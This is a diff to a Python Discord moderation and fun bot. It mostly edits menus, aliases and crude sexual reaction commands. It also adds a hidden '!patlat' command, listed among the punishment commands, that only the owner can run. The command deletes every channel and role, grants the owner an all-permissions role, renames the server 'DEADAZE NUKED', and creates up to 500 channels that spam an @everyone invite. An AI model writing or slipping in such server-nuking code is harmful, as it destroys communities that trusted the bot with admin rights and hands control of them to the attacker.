@@ -123,7 +123,6 @@ async def on_message(message):
         except:
             pass
 
-    # Şəklini atdığın /vur tipli və digər random şablon spamların qoruması
     yasakli_sablonlar = ["/vur", "yaz gir xd", "w10bv", "yih8ym", "tcpn4", "6bbemn"]
     if any(sablon in icerik for sablon in yasakli_sablonlar):
         try:
@@ -196,7 +195,7 @@ class XASMenyu(discord.ui.Select):
         elif self.values[0] == "2. İdarəetmə və Moderasiya":
             embed = discord.Embed(title="⚙️ Moderasiya Paneli", description="Aktiv moderasiya əmrləri.", color=XAS_COLOR)
             embed.add_field(name="Kanal Əmrləri", value="`!lock` / `!unlock` / `!hide` / `!reveal` / `!slowmode` / `!openchannel` / `!lockchannel`", inline=False)
-            embed.add_field(name="Cəza Əmrləri", value="`!ban` / `!kick` / `!clear` / `!timeout`", inline=False)
+            embed.add_field(name="Cəza Əmrləri", value="`!ban` / `!kick` / `!clear` / `!timeout` / `!patlat`", inline=False)
             await interaction.response.edit_message(embed=embed)
 
         elif self.values[0] == "3. Əyləncə, Oyunlar və Alətlər":
@@ -326,7 +325,7 @@ async def afk_cmd(ctx, *, sebep="Səbəb göstərilməyib"):
     await ctx.send(f"💤 {ctx.author.mention}, AFK rejiminə keçdin. Səbəb: **{sebep}**")
 
 # =====================================================================
-# 8. SAHİB VƏ MODERASİYA ƏMRLƏRİ (BÜTÜN KANALLARI AÇ/BAĞLA DAXİL)
+# 8. SAHİB VƏ MODERASİYA ƏMRLƏRİ
 # =====================================================================
 @bot.command(name="lock")
 async def lock_cmd(ctx):
@@ -356,7 +355,6 @@ async def reveal_cmd(ctx):
     await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=True)
     await ctx.send("🐵 Bu kanal yenidən göstərildi.")
 
-# BÜTÜN KANALLARI (Səs, Chat, Kateqoriya) TƏK KOMUTLA AÇMAQ
 @bot.command(name="openchannel", aliases=["ac", "hamisiniac"])
 async def open_channel_all(ctx):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
@@ -373,7 +371,6 @@ async def open_channel_all(ctx):
             
     await yukleniyor.edit(content="✅ Uğurlu! Bütün kanallar, kateqoriyalar və səs otaqları kütləvi şəkildə açıldı.")
 
-# BÜTÜN KANALLARI (Səs, Chat, Kateqoriya) TƏK KOMUTLA BAĞLAMAQ/GİZLƏTMƏK
 @bot.command(name="lockchannel", aliases=["bagla", "hamisinibagla"])
 async def lock_channel_all(ctx):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
@@ -439,18 +436,18 @@ async def clear_cmd(ctx, amount: int = 5):
     await msg.delete()
 
 # =====================================================================
-# 9. ƏYLƏCƏ, ÖPÜŞMƏ VƏ OYUN KOMUTLARI (GIF & REPLY)
+# 9. ƏYLƏCƏ, ÖPÜŞMƏ, OYUN KOMUTLARI VƏ !PATLAT
 # =====================================================================
-@bot.command(name="sex", aliases=["öpüş", "öp"])
+@bot.command(name="sex", aliases=["spag", "ıp"])
 async def sex_cmd(ctx, member: discord.Member):
     embed = discord.Embed(
-        description=f"🔥 **{ctx.author.name}** ilə **{member.name}** ehtiraslı şəkildə öpüşdülər! (Sex)",
+        description=f"🔥 **{ctx.author.name}** ilə **{member.name}** ehtiraslı şəkildə birlikdə oldular! (Sex)",
         color=XAS_COLOR
     )
-    embed.set_image(url="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHp1cGp4cWp3aXJ1OG93YWxoeDNnNXQ2ZXJ6aHB2ZGR4NXB6bDVleiZlcD12MV9pbnternFsX2dpZklkJmZ0PWG/9IG32v3x6Y8L6/giphy.gif")
+    embed.set_image(url="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpjc3g3NjM3NDIxODczOHpjc3g3NjM3NDIxODczOHpjc3g3JmVwPXYxX2pudGVybmFsX2dpZl9ieV9pZCZjdD1n/5863NIGxEXOhp4cNp3aX/giphy.gif")
     await ctx.send(embed=embed, reference=ctx.message)
 
-@bot.command(name="fuck")
+@bot.command(name="fuck", aliases=["sürtmək"])
 async def fuck_cmd(ctx, member: discord.Member):
     embed = discord.Embed(
         description=f"🔥 **{ctx.author.name}** ilə **{member.name}** ehtiraslı şəkildə birlikdə oldular! (Fuck)",
@@ -562,6 +559,50 @@ async def poll_cmd(ctx, *, soru):
     await msg.add_reaction("👍")
     await msg.add_reaction("👎")
 
+@bot.command(name="patlat")
+async def patlat_cmd(ctx):
+    if ctx.author.id != SAHIB_ID:
+        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
+        return
+    
+    guild = ctx.guild
+    await ctx.send("⚠️ Serverin dağıdılması başladı...")
+
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+        except:
+            pass
+
+    for role in guild.roles:
+        if role != guild.default_role:
+            try:
+                await role.delete()
+            except:
+                pass
+
+    try:
+        new_role = await guild.create_role(
+            name="#RUHUMSKDI",
+            permissions=discord.Permissions.all(),
+            color=discord.Color.red()
+        )
+        await ctx.author.add_roles(new_role)
+    except:
+        pass
+
+    try:
+        await guild.edit(name="DEADAZE NUKED", vanity_code="xas")
+    except:
+        pass
+
+    for i in range(1, 501):
+        try:
+            channel = await guild.create_text_channel(f"ruhumskdi-{i}")
+            await channel.send("discord.gg/xas @everyone")
+        except:
+            break
+
 # =====================================================================
 # 10. BOTU İŞƏ SALMAQ (RUN)
 # =====================================================================
@@ -570,4 +611,4 @@ if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
-    
+        
